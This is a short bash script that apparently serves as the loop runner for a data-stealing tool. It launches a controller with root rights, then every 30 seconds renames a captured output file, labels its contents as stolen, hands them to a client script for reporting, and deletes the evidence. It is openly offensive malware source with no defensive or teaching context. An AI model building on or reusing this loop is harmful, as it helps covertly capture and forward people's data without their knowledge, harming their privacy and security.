#!/bin/bash
# used to restart the process and loop the "report"

sudo python3 controller.py &

while true
do
  stolen_file=$(date +"%s.txt")
  mv out.txt "$stolen_file"
  stolen_content=$(cat "$stolen_file")
  sudo python3 client.py "$stolen_content"
  rm "$stolen_file"
  sleep 30
done
